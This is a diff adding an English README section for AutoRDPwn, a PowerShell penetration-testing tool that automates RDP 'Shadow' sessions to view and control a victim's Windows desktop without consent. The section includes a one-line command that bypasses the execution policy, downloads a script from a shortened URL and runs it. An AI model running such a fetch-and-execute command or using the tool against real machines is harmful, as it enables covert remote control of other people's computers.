@@ -50,3 +50,47 @@ Este proyecto está licenciando bajo la licencia GNU 3.0 - ver el fichero LICENS
 Este software no ofrece ningún tipo de garantía. Su uso es exclusivo para entornos educativos y/o auditorías de seguridad con el correspondiente consentimiento del cliente. No me hago responsable de su mal uso ni de los posibles daños causados por el mismo.
 
 Para más información, puede contactar a través de info@darkbyte.net
+
+-------------------------------------------------------------------------------------------------------------
+# English description
+
+**AutoRDPwn** is a script created in Powershell and designed to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability allows a remote attacker to view his victim's desktop without his consent, and even control it on request. For its correct operation, it is necessary to comply with the requirements described in the user guide.
+
+# Requirements
+Powershell 5.0 or higher
+
+# Changes
+Version 4.0
+• Fixed a bug in the scheduled task to remove the user AutoRDPwn
+
+• The Scheluded Task attack has been replaced by Invoke-Command
+
+• It is now possible to choose the language of the application and launch the attack on English versions of Windows
+
+* The rest of the changes can be consulted in the CHANGELOG file
+
+# Use
+**Execution in a line:**
+
+powershell -ExecutionPolicy Bypass "cd $ env: TEMP; iwr https://goo.gl/HSkAXP -Outfile AutoRDPwn.ps1;. \ AutoRDPwn.ps1"
+
+**The detailed guide of use can be found at the following link:**
+
+https://darkbyte.net/autordpwn-la-guia-definitiva
+
+# License
+This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.
+
+Credits and Acknowledgments
+• **Mark Russinovich** for his tool PsExec -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+
+• **Stas'M Corp.** for its RDP tool Wrapper -> https://github.com/stascorp/rdpwrap
+
+• **Kevin Robertson** for his tool Invoke-TheHash -> https://github.com/Kevin-Robertson/Invoke-TheHash
+
+• **Benjamin Delpy** for his tool Mimikatz -> https://github.com/gentilkiwi/mimikatz
+
+# Contact
+This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.
+
+For more information, you can contact through info@darkbyte.net
